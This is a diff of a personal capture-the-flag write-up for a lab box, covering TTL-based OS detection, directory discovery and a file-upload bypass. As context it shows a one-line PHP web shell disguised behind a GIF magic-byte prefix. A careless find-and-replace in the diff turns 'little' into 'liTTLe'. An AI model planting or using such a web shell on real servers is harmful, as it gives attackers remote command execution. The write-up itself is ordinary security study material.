@@ -12,7 +12,7 @@ Learnt:
 
 ## Recon
 
-The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
+The time to live(TTL) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
 ![ping](OS-ProvingGrounds/Apex/Screenshots/ping.png)
 Feroxbuster found a uploads directory
 ![](ferox.png)
@@ -181,7 +181,7 @@ Content-Type: application/x-php
 GIF8;<?php system($_REQUEST['cmd']); ?>
 ```
 
-I  was so close I just did not try the extension the other way around. That check for myself made it into my methodolopgical checks so I really felt think although this seemed from the outset like a massive failure on my part, but really after some thought this was actually a real success. I have found it is the little details that really make or break anything in hacking checks and following and managing the flow of checks and data result from those checks as important in improve success rate.
+I  was so close I just did not try the extension the other way around. That check for myself made it into my methodolopgical checks so I really felt think although this seemed from the outset like a massive failure on my part, but really after some thought this was actually a real success. I have found it is the liTTLe details that really make or break anything in hacking checks and following and managing the flow of checks and data result from those checks as important in improve success rate.
 
 Amusingly I tried other writeups I felt like my original attempt of appending php to a picture was actual the moethod of [snowscan](https://snowscan.io/htb-writeup-networked/#) top 100 HTB. To mock my own reading to ensure improvement I decide to use this picture as some of the fun of CTF file upload vulnerabilities is funny files to upload.
 
